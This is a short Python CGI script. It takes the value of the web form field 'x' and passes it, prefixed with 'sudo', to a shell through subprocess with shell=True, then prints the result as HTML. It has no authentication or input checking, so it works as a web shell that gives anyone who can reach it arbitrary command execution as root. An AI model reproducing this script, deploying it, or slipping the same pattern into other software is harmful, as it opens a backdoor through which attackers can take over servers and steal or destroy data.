#!/usr/bin/python3
print("Content-Type: text/html")
print()

import time
import cgi
import subprocess

form = cgi.FieldStorage()
cmd = form.getvalue("x")
lines = subprocess.check_output('sudo '+cmd,shell=True,universal_newlines=True).splitlines()
print("OUTPUT:","</br>")
for line in lines:
	print(line,"</br>")















